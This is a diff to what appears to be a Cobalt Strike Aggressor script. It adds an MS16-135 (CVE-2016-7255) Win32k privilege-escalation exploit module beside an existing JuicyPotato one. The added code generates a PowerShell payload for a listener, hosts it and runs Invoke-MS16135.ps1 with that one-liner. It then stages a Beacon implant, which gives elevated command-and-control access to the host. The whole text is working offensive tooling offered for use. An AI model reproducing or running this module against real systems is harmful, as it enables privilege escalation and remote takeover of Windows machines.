@@ -303,3 +303,34 @@ sub juicypotato {
 }
 
 beacon_exploit_register("juicypotato", "JuicyPotato (ms16-075)", &juicypotato);
+
+
+sub ms16_135 {
+
+	local('$script $oneliner');
+
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via MS16-135");
+
+	# Generate PowerShell
+	$script = artifact($2, "powershell");
+
+	# Host script
+	$oneliner = beacon_host_script($1, $script);
+
+	# Source
+	$source = getFileProper(script_resource("elevate\\modules"), "Invoke-MS16135.ps1");
+
+	# Import & run
+	bpowershell_import!($1, $source);
+	bpowerpick!($1, "Invoke-MS16135 -Command \" $+ $oneliner $+ \"");
+
+	# Wait
+	bpause($1, 10000);
+
+	# Stage
+	bstage($1, $null, $2);
+
+}
+
+
+beacon_exploit_register("ms16-135", "Win32k Elevation of Privilege (CVE-2016-7255)", &ms16_135);
